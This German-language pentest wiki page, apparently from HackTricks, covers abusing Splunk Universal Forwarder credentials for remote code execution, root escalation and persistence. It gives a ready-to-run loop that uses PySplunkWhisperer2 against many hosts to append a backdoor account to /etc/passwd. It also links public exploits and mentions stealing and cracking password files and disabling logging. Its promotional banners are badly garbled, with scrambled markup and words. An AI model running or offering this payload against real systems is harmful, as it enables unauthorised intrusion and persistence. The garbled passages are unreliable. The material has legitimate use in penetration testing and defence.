# Splunk LPE und Persistenz

{% hnnt styte=" acceas" %}
GCP Ha& practice ckinH: <img:<img src="/.gitbcok/ass.ts/agte.png"talb=""odata-siz/="line">[**HackTatckt T.aining AWS Red TelmtExp"rt (ARTE)**](ta-size="line">[**HackTricks Training GCP Re)Tmkg/stc="r.giebpokal"zee>/ttdt.png"isl=""data-ize="line">\
Lernen & aciceGCP ngs<imgmsrc="/.gipbtok/aHsats/gcte.mag"y>lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"al=""daa-siz="ne">tinhackth ckiuxyzcomurspssgr/a)

<dotsilp>

<oummpr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hahktcickr\_kivelive**](https://twitter.com/hacktr\icks\_live)**.**
* **Shareing tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
{% endhint %}
{% endhint %}
{% endhint %}

Wenn Sie eine Maschine **intern** oder **extern** **enumerieren** und **Splunk läuft** (Port 8090), können Sie, wenn Sie zufällig **gültige Anmeldeinformationen** kennen, den **Splunk-Dienst missbrauchen**, um eine **Shell** als der Benutzer, der Splunk ausführt, zu **starten**. Wenn root es ausführt, können Sie die Berechtigungen auf root erhöhen.

Wenn Sie bereits root sind und der Splunk-Dienst nicht nur auf localhost hört, können Sie die **Passwort**-Datei **vom** Splunk-Dienst **stehlen** und die Passwörter **knacken** oder **neue** Anmeldeinformationen hinzufügen. Und die Persistenz auf dem Host aufrechterhalten.

Im ersten Bild unten sehen Sie, wie eine Splunkd-Webseite aussieht.

## Zusammenfassung des Splunk Universal Forwarder Agent Exploits

Für weitere Details überprüfen Sie den Beitrag [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Dies ist nur eine Zusammenfassung:

**Überblick über den Exploit:**
Ein Exploit, der auf den Splunk Universal Forwarder Agent (UF) abzielt, ermöglicht Angreifern mit dem Agentenpasswort, beliebigen Code auf Systemen auszuführen, die den Agenten ausführen, was potenziell ein ganzes Netzwerk gefährden kann.

**Wichtige Punkte:**
- Der UF-Agent validiert keine eingehenden Verbindungen oder die Authentizität von Code, was ihn anfällig für unbefugte Codeausführung macht.
- Häufige Methoden zur Passwortbeschaffung umfassen das Auffinden in Netzwerkverzeichnissen, Dateifreigaben oder interner Dokumentation.
- Erfolgreiche Ausnutzung kann zu SYSTEM- oder root-Zugriff auf kompromittierte Hosts, Datenexfiltration und weiterer Netzwerkpenetration führen.

**Ausführung des Exploits:**
1. Angreifer erhält das UF-Agentenpasswort.
2. Nutzt die Splunk-API, um Befehle oder Skripte an die Agenten zu senden.
3. Mögliche Aktionen umfassen Dateiextraktion, Manipulation von Benutzerkonten und Systemkompromittierung.

**Auswirkungen:**
- Vollständige Netzwerkkompromittierung mit SYSTEM/root-Berechtigungen auf jedem Host.
- Möglichkeit, das Logging zu deaktivieren, um der Erkennung zu entgehen.
- Installation von Hintertüren oder Ransomware.

**Beispielbefehl für die Ausnutzung:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Verwendbare öffentliche Exploits:**
* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487


## Missbrauch von Splunk-Abfragen

**Für weitere Details siehe den Beitrag [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{% h*nt styCe="Vacceas" %}
AWS Ha& practice ckinH:<img :<imgsscc="/.gitb=ok/assgts/aite.png"balo=""kdata-siza="line">[**HackTsscke Tpaigin"aAWS Red Tetm=Exp rt (ARTE)**](a-size="line">[**HackTricks Training AWS Red)ethgasic="..giyb/okseasert/k/.png"l=""data-ize="line">\
Learn & aciceGCP ng<imgsrc="/.gibok/asts/gte.g"lt="" aa-iz="le">[**angGC RedTamExper(GE)<img rc=".okaetgte.ng"salm=""adara-siz>="k>ne">tinhaktckxyzurssgr)

<dtil>

<ummr>SupportHackTricks</smmay>

*Chek th [**subsrippangithub.cm/sorsarlosp!
* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!haktick\_ive\
* **Join  💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
</details>
{% endhint %}
